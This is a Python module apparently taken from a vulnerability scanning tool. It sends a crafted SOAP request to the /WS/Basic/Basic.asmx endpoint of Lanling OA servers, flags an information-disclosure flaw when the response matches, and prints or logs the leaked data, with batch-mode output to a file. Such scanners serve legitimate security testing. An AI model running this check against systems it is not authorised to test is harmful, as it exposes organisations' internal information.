#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile
urllib3.disable_warnings()

class Lanling_Info_Scan:
    def get_url(self,input_url):
        try:
            url = input_url + "/WS/Basic/Basic.asmx"
            header = {
                "User-Agent": self.headers["User-Agent"],
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Content-Type": "text/xml;charset=UTF-8",
                "Cookie": "ASP.NET_SessionId=u1n0cky5q5giplqhpajjrf55; FIOA_IMG_FOLDER=FI",
                "SOAPAction": "http://tempuri.org/WS_getAllInfos",
                "Upgrade-Insecure-Requests": "1",
            }
            data = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:WS_getAllInfos/>
</soapenv:Body>
</soapenv:Envelope>"""
            req = requests.post(url,headers=header,proxies=self.proxy,verify=self.ssl,data=data)
            if "WS_getA" in req.text:
                OutPrintInfoSuc("Lanling", f'目标存在信息泄露漏洞: {url}')
                if self.batch:
                    OutPutFile("lanling_info.txt",f'目标存在信息泄露漏洞: {url}')
                else:
                    OutPrintInfo("Lanling", f'响应:\n{req.text.strip()}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Lanling", f'目标不存在信息泄露漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Lanling",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Lanling", '开始检测信息泄露漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("Lanling", '信息泄露漏洞检测结束')


